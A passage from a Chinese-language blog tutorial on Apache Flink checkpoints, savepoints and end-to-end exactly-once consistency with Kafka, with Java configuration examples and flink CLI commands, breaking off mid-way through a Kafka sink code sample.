分布式快照算法（Barrier对齐的精准一次）</h3><p>watermark指示的是“之前的数据全部到齐了”，而barrier指示的是“之前所有数据的状态更改保存入当前检查点”：它们都是一个“截止时间”的标志。所以在处理多个分区的传递时，也要以是否还会有数据到来作为一个判断标准。</p><ul><li>当上游任务向多个并行下游任务发送barrier时，需要广播出去；</li><li>而当多个上游任务向同一个下游任务传递分界线时，需要在下游任务执行“分界线对齐”操作，也就是需要等到所有并行分区的barrier都到齐，才可以开始状态的保存</li></ul><p>下面是执行顺序：</p><p>（1）触发检查点：JobManager向Source发送Barrier；</p><p>（2）Barrier发送：向下游广播发送；</p><p>（3）Barrier对齐：下游需要收到上游所有并行度传递过来的Barrier才做自身状态的保存；</p><p>（4）状态保存：有状态的算子将状态保存至持久化。</p><p>（5）先处理缓存数据，然后正常继续处理</p><h3 id="2-3-分布式快照算法（Barrier对齐的至少一次）">2.3 分布式快照算法（Barrier对齐的至少一次）</h3><p>和精准一次类似，但是保存的数据在宕机重启时会重复计算</p><h3 id="2-4-分布式快照算法（非Barrier对齐的精准一次）">2.4 分布式快照算法（非Barrier对齐的精准一次）</h3><p><img src="http://qnypic.shawncoding.top/blog/202404161646766.png" alt></p><h3 id="2-5-总结">2.5 总结</h3><ul><li>Barrier对齐：一个Task收到所有上游同一个编号的barrier之后，才会对自己的本地状态做备份<ul><li>精准一次：在barrier对齐过程中，barrier后面的数据阻塞等待(不会越过barrier)</li><li>至少一次：在barrier对齐过程中，先到的barrier，其后面的数据不阻塞，接着计算</li></ul></li><li>非Barrier对齐：一个Task收到第一个barrier时，就开始执行备份<ul><li>先到的barrier，将本地状态备份，其后面的数据接着计算输出</li><li>未到的barrier，其前面的数据接着计算输出，同时也保存到备份中</li><li>最后一个barrier到达该Task时，这个Task的备份结束</li></ul></li></ul><h2 id="3、检查点配置">3、检查点配置</h2><h3 id="3-1-启用检查点">3.1 启用检查点</h3><p>默认情况下，Flink程序是禁用检查点的。如果想要为Flink应用开启自动保存快照的功能，需要在代码中显式地调用执行环境的.enableCheckpointing()方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">StreamExecutionEnvironment env = </span><br><span class="line">StreamExecutionEnvironment.getExecutionEnvironment();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 这里需要传入一个长整型的毫秒数，表示周期性保存检查点的间隔时间。如果不传参数直接启用检查点，默认的间隔周期为500毫秒，这种方式已经被弃用</span></span><br><span class="line"><span class="comment">// 每隔1秒启动一次检查点保存</span></span><br><span class="line">env.enableCheckpointing(<span class="number">1000</span>);</span><br></pre></td></tr></table></figure><h3 id="3-2-检查点存储">3.2 检查点存储</h3><p>检查点具体的持久化存储位置，取决于“检查点存储”的设置。默认情况下，检查点存储在JobManager的堆内存中。而对于大状态的持久化保存，Flink也提供了在其他存储位置进行保存的接口</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 配置存储检查点到JobManager堆内存</span></span><br><span class="line">env.getCheckpointConfig().setCheckpointStorage(<span class="keyword">new</span> JobManagerCheckpointStorage());</span><br><span class="line"></span><br><span class="line"><span class="comment">// 配置存储检查点到文件系统</span></span><br><span class="line">env.getCheckpointConfig().setCheckpointStorage(<span class="keyword">new</span> FileSystemCheckpointStorage(<span class="string">"hdfs://namenode:40010/flink/checkpoints"</span>));</span><br><span class="line"><span class="comment">// 对于实际生产应用，我们一般会将CheckpointStorage配置为高可用的分布式文件系统（HDFS，S3等）。</span></span><br></pre></td></tr></table></figure><h3 id="3-3-其它高级配置">3.3 其它高级配置</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 检查点还有很多可以配置的选项，可以通过获取检查点配置（CheckpointConfig）来进行设置</span></span><br><span class="line">CheckpointConfig checkpointConfig = env.getCheckpointConfig();</span><br></pre></td></tr></table></figure><ul><li><p>检查点模式（CheckpointingMode）</p><p>设置检查点一致性的保证级别，有“精确一次”（exactly-once）和“至少一次”（at-least-once）两个选项。默认级别为exactly-once，而对于大多数低延迟的流处理程序，at-least-once就够用了，而且处理效率会更高。</p></li><li><p>超时时间（checkpointTimeout）</p><p>用于指定检查点保存的超时时间，超时没完成就会被丢弃掉。传入一个长整型毫秒数作为参数，表示超时时间。</p></li><li><p>最小间隔时间（minPauseBetweenCheckpoints）</p><p>用于指定在上一个检查点完成之后，检查点协调器最快等多久可以出发保存下一个检查点的指令。这就意味着即使已经达到了周期触发的时间点，只要距离上一个检查点完成的间隔不够，就依然不能开启下一次检查点的保存。这就为正常处理数据留下了充足的间隙。当指定这个参数时，实际并发为1。</p></li><li><p>最大并发检查点数量（maxConcurrentCheckpoints）</p><p>用于指定运行中的检查点最多可以有多少个。由于每个任务的处理进度不同，完全可能出现后面的任务还没完成前一个检查点的保存、前面任务已经开始保存下一个检查点了。这个参数就是限制同时进行的最大数量。</p></li><li><p>开启外部持久化存储（enableExternalizedCheckpoints）</p><p>用于开启检查点的外部持久化，而且默认在作业失败的时候不会自动清理，如果想释放空间需要自己手工清理。里面传入的参数ExternalizedCheckpointCleanup指定了当作业取消的时候外部的检查点该如何清理。</p><ul><li>DELETE_ON_CANCELLATION：在作业取消的时候会自动删除外部检查点，但是如果是作业失败退出，则会保留检查点。</li><li>RETAIN_ON_CANCELLATION：作业取消的时候也会保留外部检查点。</li></ul></li><li><p>检查点连续失败次数（tolerableCheckpointFailureNumber）</p><p>用于指定检查点连续失败的次数，当达到这个次数，作业就失败退出。默认为0，这意味着不能容忍检查点失败，并且作业将在第一次报告检查点失败时失败。</p></li></ul><p><strong>开启非对齐检查点</strong></p><ul><li><p>非对齐检查点（enableUnalignedCheckpoints）</p><p>不再执行检查点的分界线对齐操作，启用之后可以大大减少产生背压时的检查点保存时间。这个设置要求检查点模式（CheckpointingMode）必须为exctly-once，并且最大并发的检查点个数为1。</p></li><li><p>对齐检查点超时时间（alignedCheckpointTimeout）</p><p>该参数只有在启用非对齐检查点的时候有效。参数默认是0，表示一开始就直接用非对齐检查点。如果设置大于0，一开始会使用对齐的检查点，当对齐时间超过该参数设定的时间，则会自动切换成非对齐检查点</p></li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">CheckpointConfigDemo</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        StreamExecutionEnvironment env = StreamExecutionEnvironment.createLocalEnvironmentWithWebUI(<span class="keyword">new</span> Configuration());</span><br><span class="line">        env.setParallelism(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 代码中用到hdfs，需要导入hadoop依赖、指定访问hdfs的用户名</span></span><br><span class="line">        System.setProperty(<span class="string">"HADOOP_USER_NAME"</span>, <span class="string">"atguigu"</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// TODO 检查点配置</span></span><br><span class="line">        <span class="comment">// 1、启用检查点: 默认是barrier对齐的，周期为5s, 精准一次</span></span><br><span class="line">        env.enableCheckpointing(<span class="number">5000</span>, CheckpointingMode.EXACTLY_ONCE);</span><br><span class="line">        CheckpointConfig checkpointConfig = env.getCheckpointConfig();</span><br><span class="line">        <span class="comment">// 2、指定检查点的存储位置</span></span><br><span class="line">        checkpointConfig.setCheckpointStorage(<span class="string">"hdfs://hadoop102:8020/chk"</span>);</span><br><span class="line">        <span class="comment">// 3、checkpoint的超时时间: 默认10分钟</span></span><br><span class="line">        checkpointConfig.setCheckpointTimeout(<span class="number">60000</span>);</span><br><span class="line">        <span class="comment">// 4、同时运行中的checkpoint的最大数量</span></span><br><span class="line">        checkpointConfig.setMaxConcurrentCheckpoints(<span class="number">1</span>);</span><br><span class="line">        <span class="comment">// 5、最小等待间隔: 上一轮checkpoint结束 到 下一轮checkpoint开始 之间的间隔，设置了&gt;0,并发就会变成1</span></span><br><span class="line">        checkpointConfig.setMinPauseBetweenCheckpoints(<span class="number">1000</span>);</span><br><span class="line">        <span class="comment">// 6、取消作业时，checkpoint的数据 是否保留在外部系统</span></span><br><span class="line">        <span class="comment">// DELETE_ON_CANCELLATION:主动cancel时，删除存在外部系统的chk-xx目录 （如果是程序突然挂掉，不会删）</span></span><br><span class="line">        <span class="comment">// RETAIN_ON_CANCELLATION:主动cancel时，外部系统的chk-xx目录会保存下来</span></span><br><span class="line">        checkpointConfig.setExternalizedCheckpointCleanup(CheckpointConfig.ExternalizedCheckpointCleanup.RETAIN_ON_CANCELLATION);</span><br><span class="line">        <span class="comment">// 7、允许 checkpoint 连续失败的次数，默认0--》表示checkpoint一失败，job就挂掉</span></span><br><span class="line">        checkpointConfig.setTolerableCheckpointFailureNumber(<span class="number">10</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// TODO 开启 非对齐检查点（barrier非对齐）</span></span><br><span class="line">        <span class="comment">// 开启的要求： Checkpoint模式必须是精准一次，最大并发必须设为1</span></span><br><span class="line">        checkpointConfig.enableUnalignedCheckpoints();</span><br><span class="line">        <span class="comment">// 开启非对齐检查点才生效： 默认0，表示一开始就直接用 非对齐的检查点</span></span><br><span class="line">        <span class="comment">// 如果大于0， 一开始用 对齐的检查点（barrier对齐）， 对齐的时间超过这个参数，自动切换成 非对齐检查点（barrier非对齐）</span></span><br><span class="line">        checkpointConfig.setAlignedCheckpointTimeout(Duration.ofSeconds(<span class="number">1</span>));</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        env</span><br><span class="line">                .socketTextStream(<span class="string">"hadoop102"</span>, <span class="number">7777</span>)</span><br><span class="line">                .flatMap(</span><br><span class="line">                        (String value, Collector&lt;Tuple2&lt;String, Integer&gt;&gt; out) -&gt; &#123;</span><br><span class="line">                            String[] words = value.split(<span class="string">" "</span>);</span><br><span class="line">                            <span class="keyword">for</span> (String word : words) &#123;</span><br><span class="line">                                out.collect(Tuple2.of(word, <span class="number">1</span>));</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;</span><br><span class="line">                )</span><br><span class="line">                .returns(Types.TUPLE(Types.STRING, Types.INT))</span><br><span class="line">                .keyBy(value -&gt; value.f0)</span><br><span class="line">                .sum(<span class="number">1</span>)</span><br><span class="line">                .print();</span><br><span class="line"></span><br><span class="line">        env.execute();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="3-4-通用增量-checkpoint-changelog">3.4 通用增量 checkpoint (changelog)</h3><p>在 1.15 之前，只有RocksDB 支持增量快照。不同于产生一个包含所有数据的全量备份，增量快照中只包含自上一次快照完成之后被修改的记录，因此可以显著减少快照完成的耗时。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Rocksdb状态后端启用增量checkpoint：</span></span><br><span class="line">EmbeddedRocksDBStateBackend backend = newEmbeddedRocksDBStateBackend(<span class="keyword">true</span>);</span><br></pre></td></tr></table></figure><p>从 1.15 开始，不管hashmap还是rocksdb 状态后端都可以通过开启changelog实现通用的增量checkpoint(实验室功能)</p><h3 id="3-5-最终检查点">3.5 最终检查点</h3><p>如果数据源是有界的，就可能出现部分Task已经处理完所有数据，变成finished状态，不继续工作。从 Flink 1.14 开始，这些finished状态的Task，也可以继续执行检查点。自 1.15 起默认启用此功能，并且可以通过功能标志禁用它</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Configuration config = <span class="keyword">new</span> Configuration();</span><br><span class="line">config.set(ExecutionCheckpointingOptions.ENABLE_CHECKPOINTS_AFTER_TASKS_FINISH, <span class="keyword">false</span>);</span><br><span class="line">StreamExecutionEnvironment env = StreamExecutionEnvironment.getExecutionEnvironment(config);</span><br></pre></td></tr></table></figure><h2 id="4、保存点（Savepoint）">4、保存点（Savepoint）</h2><p>除了检查点外，Flink还提供了另一个非常独特的镜像保存功能——<strong>保存点（savepoint）</strong>。从名称就可以看出，这也是一个存盘的备份，<strong>它的原理和算法与检查点完全相同</strong>，只是多了一些额外的元数据</p><h3 id="4-1-保存点的用途">4.1 保存点的用途</h3><p>保存点与检查点最大的区别，就是触发的时机。检查点是由Flink自动管理的，定期创建，发生故障之后自动读取进行恢复，这是一个“自动存盘”的功能；而保存点不会自动创建，必须由用户明确地手动触发保存操作，所以就是“手动存盘”。</p><p>保存点可以当作一个强大的运维工具来使用。我们可以在需要的时候创建一个保存点，然后停止应用，做一些处理调整之后再从保存点重启。它适用的具体场景有：</p><ul><li>版本管理和归档存储</li><li>更新Flink版本</li><li>更新应用程序</li><li>调整并行度</li><li>暂停应用程序</li></ul><p>需要注意的是，保存点能够在程序更改的时候依然兼容，前提是状态的拓扑结构和数据类型不变。我们知道保存点中状态都是以算子ID-状态名称这样的key-value组织起来的，算子ID可以在代码中直接调用SingleOutputStreamOperator的.uid()方法来进行指定</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">DataStream&lt;String&gt; stream = env</span><br><span class="line">    .addSource(<span class="keyword">new</span> StatefulSource()).uid(<span class="string">"source-id"</span>)</span><br><span class="line">    .map(<span class="keyword">new</span> StatefulMapper()).uid(<span class="string">"mapper-id"</span>)</span><br><span class="line">    .print();</span><br></pre></td></tr></table></figure><p><strong>对于没有设置ID的算子，Flink默认会自动进行设置，所以在重新启动应用后可能会导致ID不同而无法兼容以前的状态。所以为了方便后续的维护，强烈建议在程序中为每一个算子手动指定ID</strong></p><h3 id="4-2-使用保存点">4.2 使用保存点</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># =============创建保存点===============</span></span><br><span class="line"><span class="comment"># 要在命令行中为运行的作业创建一个保存点镜像，只需要执行</span></span><br><span class="line"><span class="comment"># 这里jobId需要填充要做镜像保存的作业ID，目标路径targetDirectory可选，表示保存点存储的路径</span></span><br><span class="line">bin/flink savepoint :jobId [:targetDirectory]</span><br><span class="line"><span class="comment"># 于保存点的默认路径，可以通过配置文件flink-conf.yaml中的state.savepoints.dir项来设定</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 当然对于单独的作业，我们也可以在程序代码中通过执行环境来设置</span></span><br><span class="line">env.setDefaultSavepointDir(<span class="string">"hdfs:///flink/savepoints"</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment"># 由于创建保存点一般都是希望更改环境之后重启，所以创建之后往往紧接着就是停掉作业的操作。除了对运行的作业创建保存点，我们也可以在停掉一个作业时直接创建保存点</span></span><br><span class="line">bin/flink stop --savepointPath [:targetDirectory] :jobId</span><br><span class="line"></span><br><span class="line"><span class="comment"># ============从保存点重启应用========</span></span><br><span class="line"><span class="comment"># 从保存点重启一个应用</span></span><br><span class="line">bin/flink run -s :savepointPath [:runArgs]</span><br><span class="line"><span class="comment"># 这里只要增加一个-s参数，指定保存点的路径就可以了，其它启动时的参数还是完全一样的，如果是基于yarn的运行模式还需要加上 -yid application-id</span></span><br><span class="line"><span class="comment"># Flink的Web UI，这里只要增加一个-s参数，指定保存点的路径就可以了，其它启动时的参数还是完全一样的，如果是基于yarn的运行模式还需要加上 -yid application-id</span></span><br></pre></td></tr></table></figure><h3 id="4-3-使用保存点切换状态后端">4.3 使用保存点切换状态后端</h3><p>使用savepoint恢复状态的时候，也可以更换状态后端。但是有一点需要注意的是，不要在代码中指定状态后端了， 通过配置文件来配置或者-D 参数配置</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 打包时，服务器上有的就provided，可能遇到依赖问题，报错：javax.annotation.Nullable找不到，可以导入如下依赖</span></span><br><span class="line">&lt;dependency&gt;</span><br><span class="line">    &lt;groupId&gt;com.google.code.findbugs&lt;/groupId&gt;</span><br><span class="line">    &lt;artifactId&gt;jsr305&lt;/artifactId&gt;</span><br><span class="line">    &lt;version&gt;1.3.9&lt;/version&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 提交flink作业</span></span><br><span class="line">bin/flink run-application -d -t yarn-application -Dstate.backend=hashmap -c com.atguigu.checkpoint.SavepointDemo FlinkTutorial-1.0-SNAPSHOT.jar</span><br><span class="line"><span class="comment"># 停止flink作业时，触发保存点</span></span><br><span class="line"><span class="comment"># 方式一：stop优雅停止并触发保存点，要求source实现StoppableFunction接口</span></span><br><span class="line">bin/flink stop -p savepoint路径 job-id -yid application-id</span><br><span class="line"><span class="comment"># 方式二：cancel立即停止并触发保存点</span></span><br><span class="line">bin/flink cancel -s savepoint路径 job-id -yid application-id</span><br><span class="line"><span class="comment"># 案例中source是socket，不能用stop</span></span><br><span class="line">bin/flink cancel -s hdfs://hadoop102:8020/sp cffca338509ea04f38f03b4b77c8075c -yid application_1681871196375_0001</span><br><span class="line"></span><br><span class="line"><span class="comment"># 从savepoint恢复作业，同时修改状态后端</span></span><br><span class="line">bin/flink run-application -d -t yarn-application -s hdfs://hadoop102:8020/sp/savepoint-267cc0-47a214b019d5 -Dstate.backend=rocksdb -c com.atguigu.checkpoint.SavepointDemo FlinkTutorial-1.0-SNAPSHOT.jar</span><br><span class="line"></span><br><span class="line"><span class="comment"># 从保存下来的checkpoint恢复作业</span></span><br><span class="line">bin/flink run-application -d -t yarn-application -Dstate.backend=rocksdb -s hdfs://hadoop102:8020/chk/532f87ef4146b2a2968a1c137d33d4a6/chk-175 -c com.atguigu.checkpoint.SavepointDemo ./FlinkTutorial-1.0-SNAPSHOT.jar</span><br><span class="line"><span class="comment"># 如果停止作业时，忘了触发保存点也不用担心，现在版本的flink支持从保留在外部系统的checkpoint恢复作业，但是恢复时不支持切换状态后端。</span></span><br></pre></td></tr></table></figure><h2 id="5、状态一致性">5、状态一致性</h2><h3 id="5-1-一致性概念和级别">5.1 一致性概念和级别</h3><p>一致性其实就是结果的正确性，一般从数据丢失、数据重复来评估。流式计算本身就是一个一个来的，所以正常处理的过程中结果肯定是正确的；但在发生故障、需要恢复状态进行回滚时就需要更多的保障机制了。我们通过检查点的保存来保证状态恢复后结果的正确，所以主要讨论的就是“状态的一致性”。</p><p>一般说来，状态一致性有三种级别：</p><ul><li><strong>最多一次（At-Most</strong>-<strong>Once</strong>）</li><li><strong>至少一次（At</strong>-<strong>Least</strong>-<strong>Once</strong>）</li><li><strong>精确一次（Exactly-Once</strong>）</li></ul><h3 id="5-2-端到端状态一致性">5.2 端到端状态一致性</h3><p>我们已经知道检查点可以保证Flink内部状态的一致性，而且可以做到精确一次。那是不是说，只要开启了检查点，发生故障进行恢复，结果就不会有任何问题呢？</p><p>在实际应用中，一般要保证从用户的角度看来，最终消费的数据是正确的。而用户或者外部应用不会直接从Flink内部的状态读取数据，往往需要我们将处理结果写入外部存储中。这就要求我们不仅要考虑Flink内部数据的处理转换，还涉及到从外部数据源读取，以及写入外部持久化系统，整个应用处理流程从头到尾都应该是正确的。</p><p>所以完整的流处理应用，应该包括了数据源、流处理器和外部存储系统三个部分。这个完整应用的一致性，就叫做“端到端（end-to-end）的状态一致性”，它取决于三个组件中最弱的那一环。一般来说，能否达到at-least-once一致性级别，主要看数据源能够重放数据；而能否达到exactly-once级别，流处理器内部、数据源、外部存储都要有相应的保证机制</p><h2 id="6、端到端精准一次">6、端到端精准一次</h2><p><img src="http://qnypic.shawncoding.top/blog/202404161646767.png" alt></p><h3 id="6-1-输入端保证">6.1 输入端保证</h3><p>输入端主要指的就是Flink读取的外部数据源。对于一些数据源来说，并不提供数据的缓冲或是持久化保存，数据被消费之后就彻底不存在了，例如socket文本流。对于这样的数据源，故障后我们即使通过检查点恢复之前的状态，可保存检查点之后到发生故障期间的数据已经不能重发了，这就会导致数据丢失。所以就只能保证at-most-once的一致性语义，相当于没有保证</p><p>想要在故障恢复后不丢数据，外部数据源就必须拥有重放数据的能力。常见的做法就是对数据进行持久化保存，并且可以重设数据的读取位置。一个最经典的应用就是Kafka。在Flink的Source任务中将数据读取的偏移量保存为状态，这样就可以在故障恢复时从检查点中读取出来，对数据源重置偏移量，重新获取数据</p><p>数据源可重放数据，或者说可重置读取数据偏移量，加上Flink的Source算子将偏移量作为状态保存进检查点，就可以保证数据不丢。这是达到at-least-once一致性语义的基本要求，当然也是实现端到端exactly-once的基本要求</p><h3 id="6-2-输出端保证">6.2 输出端保证</h3><p>为了实现端到端exactly-once，我们还需要对外部存储系统、以及Sink连接器有额外的要求。能够保证exactly-once一致性的写入方式有两种：<strong>幂等写入和事务写入</strong></p><ul><li><strong>幂等写入</strong></li></ul><p>所谓“幂等”操作，就是说一个操作可以重复执行很多次，但只导致一次结果更改</p><ul><li><strong>事务（Transactional）写入</strong></li></ul><p>具体来说，又有两种实现方式：<strong>预写日志（WAL）和两阶段提交（2PC）</strong></p><h3 id="6-3-Flink和Kafka连接时的精确一次保证">6.3 Flink和Kafka连接时的精确一次保证</h3><p><img src="http://qnypic.shawncoding.top/blog/202404161646768.png" alt></p><ul><li><strong>Flink内部</strong></li></ul><p>Flink内部可以通过检查点机制保证状态和处理结果的exactly-once语义。</p><ul><li><strong>输入端</strong></li></ul><p>输入数据源端的Kafka可以对数据进行持久化保存，并可以重置偏移量（offset）。所以我们可以在Source任务（FlinkKafkaConsumer）中将当前读取的偏移量保存为算子状态，写入到检查点中；当发生故障时，从检查点中读取恢复状态，并由连接器FlinkKafkaConsumer向Kafka重新提交偏移量，就可以重新消费数据、保证结果的一致性了。</p><ul><li><strong>输出端</strong></li></ul><p>输出端保证exactly-once的最佳实现，当然就是两阶段提交（2PC）。作为与Flink天生一对的Kafka，自然需要用最强有力的一致性保证来证明自己。也就是说，我们写入Kafka的过程实际上是一个两段式的提交：处理完毕得到结果，写入Kafka时是基于事务的“预提交”；等到检查点保存完毕，才会提交事务进行“正式提交”。如果中间出现故障，事务进行回滚，预提交就会被放弃；恢复状态之后，也只能恢复所有已经确认提交的操作。</p><p><strong>需要的配置</strong></p><p>（1）<code>必须启用检查点</code></p><p>（2）指定KafkaSink的发送级别为<code>DeliveryGuarantee.EXACTLY_ONCE</code></p><p>（3）配置Kafka读取数据的<code>消费者的隔离级别</code></p><p>这里所说的Kafka，是写入的外部系统。预提交阶段数据已经写入，只是被标记为“未提交”（uncommitted），而Kafka中默认的隔离级别isolation.level是read_uncommitted，也就是可以读取未提交的数据。这样一来，外部应用就可以直接消费未提交的数据，对于事务性的保证就失效了。所以应该将隔离级别配置为read_committed，表示消费者遇到未提交的消息时，会停止从分区中消费数据，直到消息被标记为已提交才会再次恢复消费。当然，这样做的话，外部应用消费数据就会有显著的延迟。</p><p>（4）事务超时配置</p><p>Flink的Kafka连接器中配置的事务超时时间<code>transaction.timeout.ms</code>默认是1小时，而Kafka集群配置的事务最大超时时间<code>transaction.max.timeout.ms</code>默认是15分钟。所以在检查点保存时间很长时，有可能出现Kafka已经认为事务超时了，丢弃了预提交的数据；而Sink任务认为还可以继续等待。如果接下来检查点保存成功，发生故障后回滚到这个检查点的状态，这部分数据就被真正丢掉了。所以这两个超时时间，前者应该小于等于后者</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">KafkaEOSDemo</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        StreamExecutionEnvironment env = StreamExecutionEnvironment.getExecutionEnvironment();</span><br><span class="line">        <span class="comment">// 代码中用到hdfs，需要导入hadoop依赖、指定访问hdfs的用户名</span></span><br><span class="line">        System.setProperty(<span class="string">"HADOOP_USER_NAME"</span>, <span class="string">"atguigu"</span>);</span><br><span class="line">        </span><br><span class="line">        </span><br><span class="line">        <span class="comment">// TODO 1、启用检查点,设置为精准一次</span></span><br><span class="line">        env.enableCheckpointing(<span class="number">5000</span>, CheckpointingMode.EXACTLY_ONCE);</span><br><span class="line">        CheckpointConfig checkpointConfig = env.getCheckpointConfig();</span><br><span class="line">        checkpointConfig.setCheckpointStorage(<span class="string">"hdfs://hadoop102:8020/chk"</span>);</span><br><span class="line">        checkpointConfig.setExternalizedCheckpointCleanup(CheckpointConfig.ExternalizedCheckpointCleanup.RETAIN_ON_CANCELLATION);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment">// TODO 2.读取kafka</span></span><br><span class="line">        KafkaSource&lt;String&gt; kafkaSource = KafkaSource.&lt;String&gt;builder()</span><br><span class="line">                .setBootstrapServers(<span class="string">"hadoop102:9092,hadoop103:9092,hadoop104:9092"</span>)</span><br><span class="line">                .setGroupId(<span class="string">"atguigu"</span>)</span><br><span class="line">                .setTopics(<span class="string">"topic_1"</span>)</span><br><span class="line">                .setValueOnlyDeserializer(<span class="keyword">new</span> SimpleStringSchema())</span><br><span class="line">                .setStartingOffsets(OffsetsInitializer.latest())</span><br><span class="line">                .build();</span><br><span class="line"></span><br><span class="line">        DataStreamSource&lt;String&gt; kafkasource = env</span><br><span class="line">                .fromSource(kafkaSource, WatermarkStrategy.forBoundedOutOfOrderness(Duration.ofSeconds(<span class="number">3</span>)), <span class="string">"kafkasource"</span>);</span><br><span class="line">        </span><br><span class="line"></span><br><span class="line">        <span class="comment">/**</span></span><br><span class="line"><span class="comment">         * TODO 3.写出到Kafka</span></span><br><span class="line"><span class="comment">         * 精准一次 写入Kafka，需要满足以下条件，缺一不可</span></span><br><span class="line"><span class="comment">         * 1、开启checkpoint</span></span><br><span class="line"><span class="comment">         * 2、sink设置保证级别为 精准一次</span></span><br><span class="line"><span class="comment">         * 3、sink设置事务前缀</span></span><br><span class="line"><span class="comment">         * 4、sink设置事务超时时间： 